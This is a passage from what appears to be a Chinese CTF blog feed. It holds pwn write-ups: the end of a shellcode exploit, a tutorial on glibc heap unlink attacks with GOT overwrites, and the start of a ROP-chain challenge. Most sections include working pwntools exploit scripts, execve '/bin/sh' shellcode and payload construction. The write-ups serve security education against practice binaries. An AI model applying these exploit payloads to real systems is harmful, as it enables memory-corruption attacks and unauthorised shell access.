class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x14</span>)+p32(<span class="number">0x8048087</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">shellcode = <span class="string">b&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#这里不能用pwntools生成的shellcode 估计是太长了 溢出空间不够</span></span><br><span class="line">payload = cyclic(<span class="number">0x14</span>)+p32(stack_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2022/11/28/unlink/"/>
      <url>/2022/11/28/unlink/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>很多时候 堆题的操作都是篡改got表 从而getshell 为了达到这一目的 就需要我们得到任意地址写的机会</p><p>其中unlink就是一个典型的办法</p><p>其主要分为两种情况 向后合并和向前合并</p><h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><p>本次演示基于的二进制文件 这里就不展示反编译后的代码了 其拥有堆溢出的机会 所以我们可以通过这个修改chunk的size域</p><p>先来看一下用于调试的代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x28</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x28</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&quot;\x61&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><p>申请了三个堆块 chunk0是用于堆溢出覆盖chunk1的size域</p><p>gdb查看一下当前堆的状况</p><p><a href="https://pic.imgdb.cn/item/6385926716f2c2beb119d0b7.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6385926716f2c2beb119d0b7.png"></a></p><p>可以看到chunk1和chunk2已经成功合并了  并且你要注意一下大小 chunk1我们申请的是0x28 但是由于堆的机制  64位的情况下申请的堆块的基本单位是0x10 所以此时这个堆块的用户空间是0x20 而gdb上显示的是0x31(0x20+0x10+0x1)</p><p>所以溢出覆盖size域的大小应该是chunk实际占用的大小</p><p><a href="https://pic.imgdb.cn/item/6385937216f2c2beb11ae6e3.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6385937216f2c2beb11ae6e3.png"></a></p><p>如果利用这种机制呢？我们chunk此时是和chunk1合并了 但是我们仍然有一个指向chunk2的指针不是吗？</p><p>如果我们此时再edit chunk2 输入的数据会存放在哪里呢</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x28</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x28</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&quot;\x61&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">gdb.attach(io)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6385948316f2c2beb11c1a08.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6385948316f2c2beb11c1a08.png"></a></p><p>其仍然有效 此时你有没有一些利用的想法 利用这个系统觉得不存在的指针？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">gdb.attach(io)</span><br></pre></td></tr></table></figure><p>看一下这个流程 看看能不能领会其用意</p><p>我们逐步分析一下</p><p>申请的chunk0，1，2没有什么疑问 是为了合并chunk</p><p>chunk3是为了防止chunk1释放以后和top chunk合并</p><p>紧接着申请了一个0x68大小的chunk4 系统就会把之前存储在unsortedbin的0xe0大小的chunk分割</p><p>此时chunk4申请到的内存空间和chunk1(未合并前)是一样的</p><p>此时我们再次申请0x68大小的chunk 分配给chunk5的就是原先chunk2的空间了</p><p>但是这里注意一下 chunk2的指针是不是仍然存在 那我们就拥有了两个指向同一内存空间的指针</p><p>我们哪怕释放掉了这个chunk 我们也可以edit其内容 如果这个chunk被释放到了fastbin呢？那么我们edit其chunk内容 是不是输入的第一个字长就是覆盖了fd域的空间 也就是说 我们伪造了一个fake chunk 让系统以为  当前的单向链表 这个chunk的下一个是我们伪造的内存空间</p><p><a href="https://pic.imgdb.cn/item/638598ab16f2c2beb120f59e.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/638598ab16f2c2beb120f59e.png"></a></p><p>可以看到 系统把aaaaaaaa当成了一个chunk的地址</p><p>是不是觉得很简单 那么我们接下来再看unlink的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//检查chunk的size和next_chunk的prev_size是否一致</span></span><br><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">malloc_printerr (“corrupted size vs. prev_size”);</span><br><span class="line">mchunkptr fd = p-&gt;fd;</span><br><span class="line">mchunkptr bk = p-&gt;bk;</span><br><span class="line"><span class="comment">//检查fd和bk(双向链表完整性)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (“corrupted <span class="type">double</span>-linked <span class="built_in">list</span>”);</span><br><span class="line">fd-&gt;bk = BK;</span><br><span class="line">bk-&gt;fd = FD;</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//检查largebin中next_size双向链表的完整性</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">|| p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (“corrupted <span class="type">double</span>-linked <span class="built_in">list</span> (not small)”);</span><br><span class="line"><span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要有两个检查</p><p>1.检查当前chunk的size和nextchunk的prev_size是否相同</p><p>2.检查链表的完整性，即fd和bk</p><p>这里size的检查很容易就绕过了 接下来的理解难点在于链表的fd和bk的伪造</p><p><a href="https://pic.imgdb.cn/item/638781b516f2c2beb107d15b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/638781b516f2c2beb107d15b.png"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P,<span class="number">0</span>))           </span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="comment">//其中的FD和BK和P为上图所示</span></span><br></pre></td></tr></table></figure><p>关键在于这一个if判断</p><p>如果你和我一样 学到这里的时候 c语言的指针都还没学透 那你可以仔细阅读下面这段话 方便你理解接下来的判断式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk相当于表示FD结构体的成员bk 而bk为结构体变量指针类型</span><br><span class="line">存储的是FD的上一个chunk，即P的prev_size的地址</span><br><span class="line">BK-&gt;fd同理 把这两个判断转化一下就是 unlink过后 BK和FD就抛弃了中间的P 他们二者的fd和bk指针互连</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk != P || BK-&gt;fd != P</span><br><span class="line">FD和BK之前已经定义过了</span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">所以上述的式子相当于:</span><br><span class="line">P-&gt;fd-&gt;bk == P &lt;=&gt; *(p-&gt;fd +0x18) == P &lt;=&gt;相当于恒等于</span><br><span class="line">p-&gt;bk-&gt;fd == P &lt;=&gt; *(p-&gt;bk +0x10) == P </span><br></pre></td></tr></table></figure><p>所以我们构造的fake_chunk的fd应该是ptr_addr-0x18</p><p>bk应该是ptr_addr-0x10</p><p>这里的ptr_addr即为我们想要任意写的地址</p><p>检查通过以后 程序就会按照下面的式子修改FD和BK的fd和bk指针</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK &lt;=&gt; P-&gt;fd-&gt;bk = p-&gt;bk &lt;=&gt; *(P-&gt;fd + 0x18) = P-&gt;bk //Ⅰ</span><br><span class="line">BK-&gt;fd = FD &lt;=&gt; P-&gt;bk-&gt;fd = p-&gt;fd &lt;=&gt; *(P-&gt;bk + 0x10) = P-&gt;fd //Ⅱ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I式的演变过程:</span><br><span class="line">∵ P-&gt;fd = &amp;P - 0x18 </span><br><span class="line">∴ *(&amp;P - 0x18 + 0x18) = P-&gt;bk =&gt; P = P-&gt;bk</span><br><span class="line">∵ P-&gt;bk = &amp;P - 0x10 </span><br><span class="line">∴ P = &amp;P - 0x10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">II式的演变过程:</span><br><span class="line">∵ P-&gt;bk = &amp;P - 0x10 </span><br><span class="line">∴ *(P-&gt;bk + 0x10) = P-&gt;fd =&gt; P = P-&gt;fd</span><br><span class="line">∵ P-&gt;fd = &amp;P - 0x18 </span><br><span class="line">∴ P = &amp;P - 0x18</span><br></pre></td></tr></table></figure><p>所以 最后的p指针将指向&amp;p-0x18的位置 也就是说当我们成功unlink后 需要增加3个字长的垃圾数据后 才能覆盖到ptr_addr</p><p>下面来看一下脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line">ptr_addr = <span class="number">0x6020C0</span></span><br><span class="line">backdoor_addr = <span class="number">0x400806</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>)+p64(ptr_addr-<span class="number">0x18</span>)+p64(ptr_addr-<span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(backdoor_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>我们先申请了三个chunk chunk0是用来构造fake_chunk chunk1则是用来迎合检查</p><p>chunk0此时的内部构造为</p><p><a href="https://pic.imgdb.cn/item/63882dab16f2c2beb1bce87c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63882dab16f2c2beb1bce87c.png"></a></p><p>绿框部分是我们伪造的fakechunk 紫框为chunk1 我们将其的prev_size和size覆盖 为了通过第一个检查</p><p>随后我们释放chunk1 如果我们构造成功 此时系统就会检查我们构造的链表是否正确</p><p>如果通过了检查 我们构造的fakechunk就会从链表中脱离</p><p>于是我们就得到了一个指向ptr_addr-0x18地址的chunk</p><p>接下来要怎么利用 注意看上面脚本的ptr_addr是存放堆块指针的bss段的数组</p><p>我们利用unlink将其存放chunk0的地址修改成printf_got的地址</p><p>那么当我们第三次edit chunk0的时候 相当于就是往printf_got的地址写入数据</p><p>于是我们将后门函数的地址写进去 当下次调用printf函数的时候 就进行了系统调用(后门函数是我为了演示方便加进去的 一般题目不会这么简单)</p><p>ps:这里在出unlink的题的时候 遇到了一个问题: 当释放chunk1想要进行unlink的时候 程序就会崩溃</p><p>后来经过两天的坐牢时间 发现了问题的原因出在于存放堆块指针的那个数组的低地址处也要有至少0x18大小的全局数组</p><p>即如下图所示 需要有个magic数组 各位师傅以后出unlink题的时候可以留意一下</p><p><a href="https://pic.imgdb.cn/item/6388305b16f2c2beb1bfedfe.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388305b16f2c2beb1bfedfe.png"></a></p><p>为什么我们经常看到别人的wp会写说 多申请一个chunk用来防止和top chunk合并 下面看一下演示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>当我们只申请了一个chunk 并且将其释放以后 你预想的是他会进入对应的bin中 但是如果他物理相邻的高地址处的chunk是topchunk的话 topchunk就会触发向后合并</p><p><a href="https://pic.imgdb.cn/item/6388311916f2c2beb1c0e3c3.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388311916f2c2beb1c0e3c3.png"></a></p><p>我们需要多申请一个chunk在要释放的chunk的物理相邻高地址处</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6388316516f2c2beb1c12c98.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388316516f2c2beb1c12c98.png"></a></p><h2 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h2><p>目前还没有遇到用到向前合并的题目 感兴趣的可以自行了解</p><h2 id="利用FD和BK的fd、bk指针"><a href="#利用FD和BK的fd、bk指针" class="headerlink" title="利用FD和BK的fd、bk指针"></a>利用FD和BK的fd、bk指针</h2><p>buu上遇到了一题比较新颖的unlink 和常规的有所不同 这里以此为例题来讲讲</p><p>其利用方向不是脱链获得任意写的机会 而是利用FD和BK在脱链后的fd和bk指针的变化来覆盖返回地址 控制程序执行流</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/chen/unlink1&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位的堆 还是比较少见的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x400</span>u);</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  *(_DWORD *)v4 = v6;</span><br><span class="line">  v6[<span class="number">1</span>] = v4;</span><br><span class="line">  *v6 = v5;</span><br><span class="line">  v5[<span class="number">1</span>] = v6;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\n&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\n&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;now that you have leaks, get shell!&quot;</span>);</span><br><span class="line">  gets(v4 + <span class="number">8</span>);</span><br><span class="line">  unlink(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请了三个堆块 并且给出了堆块v4在栈上的地址和堆上的地址</p><p>这里为了方便理解 我修改了下三个chunk的名称 接下来请以下方的代码为准</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x400</span>u);</span><br><span class="line">  A = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  B = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  C = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  *(_DWORD *)A = B;</span><br><span class="line">  B[<span class="number">1</span>] = A;</span><br><span class="line">  *B = C;</span><br><span class="line">  C[<span class="number">1</span>] = B;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\n&quot;</span>, &amp;A);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\n&quot;</span>, A);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;now that you have leaks, get shell!&quot;</span>);</span><br><span class="line">  gets(A + <span class="number">8</span>);</span><br><span class="line">  unlink(B);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先来分析一下这四行代码对这三个堆块的内容进行了哪些操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_DWORD *)A = B;</span><br><span class="line">B[<span class="number">1</span>] = A;</span><br><span class="line">*B = C;</span><br><span class="line">C[<span class="number">1</span>] = B;</span><br></pre></td></tr></table></figure><p>第一行 *A&#x3D;B 将B的首地址存在了A的fd域(实际上A并没有被释放 所以其没有fd域 这里只是为了方便称呼)</p><p>第二行 B[1]&#x3D;A B[1]相当于B的bk域 存储了A的首地址</p><p>第三行 *B&#x3D;C 将c的首地址存在了B的fd域</p><p>第四行 C[1]&#x3D;B 同理 将B的首地址存储在了c的bk域</p><p>用图片来展示一下 此时三个堆块的情况</p><p><a href="https://pic.imgdb.cn/item/63896e2c16f2c2beb16f9d5e.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63896e2c16f2c2beb16f9d5e.png"></a></p><p>可以看到 相当于模拟了三个chunk在双向链表中的情况</p><p>接着给了我们一次堆溢出的机会</p><p>get(A+8)相当于往A的bk域再往下一个字长处写入数据 即data域</p><p>接着跟进一下unlink函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_DWORD *__cdecl <span class="title function_">unlink</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  _DWORD *bk; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  bk = a1[<span class="number">1</span>];</span><br><span class="line">  fd = *a1;</span><br><span class="line">  *(fd + <span class="number">4</span>) = bk;</span><br><span class="line">  result = bk;</span><br><span class="line">  *bk = fd;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为unlink的参数是B 所以此时bk和fd的赋值就是其名(我同样对变量名称进行了修改)</p><p>在fd+4地址处的内容赋值为bk</p><p>并且将bk地址处的内容赋值为fd</p><p>那么这里就存在了一次任意地址写 如果我们通过堆溢出将fd覆盖为想要任意写的内容 接着将bk覆盖为想要任意写的地址</p><p>就可以利用这一漏洞</p><p>分析完了程序的主体流程和漏洞 接下来就是想着怎么利用了</p><p>在左侧的函数栏中发现了一个后门函数 那么显然就是要将此后门函数覆盖某一地址 然后进行系统调用</p><p>但是不同于以往的覆盖got表 这里在unlink函数结束以后 并没有调用任何libc函数</p><p>那么只能将目光看向 main函数的栈帧结束后 汇编代码是如果ret到父函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080485F2                 call    unlink</span><br><span class="line">.text:080485F7                 add     esp, 10h</span><br><span class="line">.text:080485FA                 mov     eax, 0</span><br><span class="line">.text:080485FF                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048602                 leave</span><br><span class="line">.text:08048603                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048606                 retn</span><br></pre></td></tr></table></figure><p>lea     esp, [ecx-4] 显然 我们要利用的就是这一串汇编代码</p><p>他会控制程序执行流往ecx-4所存储的地址</p><p>再看到 mov     ecx, [ebp+var_4] ecx的值等同于ebp-4地址的值</p><p>所以 我们就要利用堆溢出 覆盖B-&gt;fd为存储后门函数地址的地址  B-bk为ebp-4的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./unlink1&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25709)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./unlink1&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;here is stack address leak: &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;here is heap address leak: &quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;now that you have leaks, get shell!&quot;</span>)</span><br><span class="line">shellheap_addr = heap_addr+<span class="number">12</span></span><br><span class="line">ebp4_addr = stack_addr+<span class="number">0x14</span>-<span class="number">0x4</span></span><br><span class="line">shell_addr = <span class="number">0x80484EB</span></span><br><span class="line">payload = p32(shell_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(shellheap_addr)+p32(ebp4_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>inndy_rop</title>
      <link href="/2022/11/24/inndy-rop/"/>
      <url>/2022/11/24/inndy-rop/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这一题以前没遇到过 算是蛮新奇的 所以记录下来 还学到了ROPgadget的新用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位 没有开启pie和canary</p><p>ida打开后发现只有一个简单的gets溢出的机会</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">12</span>]; <span class="comment">// [esp+Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且这题是静态编译 ida打开会出现一大堆乱七八糟的函数 静态编译没有调用libc函数 所以这题也就不存在泄露libc然后获取system函数地址 进行系统调用的做法了</p><p>那么这时候 就需要用到ROPgadget其一个功能 自动生成一串rop链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary file_name --ropchain</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span 